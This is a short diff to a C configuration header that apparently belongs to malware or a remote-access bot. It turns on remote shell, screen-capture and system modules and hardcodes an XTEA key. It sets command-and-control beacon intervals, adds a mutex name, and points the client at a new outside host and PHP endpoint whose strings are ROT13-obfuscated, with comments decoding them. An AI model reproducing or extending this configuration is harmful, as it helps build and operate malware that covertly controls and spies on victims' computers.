@@ -13,6 +13,7 @@
 #define INSTANCEID ""
 
 // MODDEF
+#define MODSYSTEM_ENABLED   1
 #define MODSHELL_ENABLED	1
 #define MODSCREEN_ENABLED	1
 #define MODCRYPT_ENABLED	0
@@ -23,8 +24,13 @@
 #define XTEA_KEY		"JUlO.Phw5A+-aCfv"
 
 // CCDEF
+#if DEBUG
+#define CHECKIN_PACE	1
+#define SOLICIT_PACE	100
+#else
 #define CHECKIN_PACE	15
 #define SOLICIT_PACE	100
+#endif
 
 #define VARIANT_INVALID	1000//move
 
@@ -35,7 +41,7 @@
 #define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
 #else
 #define AVC_SCHEME		"uggc" // http
-#define AVC_HOST		"0k17^ay" // 0x.17.nl
+#define AVC_HOST		"0k17^arg23^arg" // 0x17.net23.net
 #define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
 #endif
 
@@ -66,6 +72,13 @@
 
 // BOOTDEF
 // #define SECURE_DOUBLE_BOOT	1
+
+// MUTEX
+#if DEBUG
+#define MUTEX           L"avcmtx"
+#else
+#define MUTEX           L"fg3ewfywdgf" // random chars
+#endif
 
 #define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
 #define staticVariant() -1
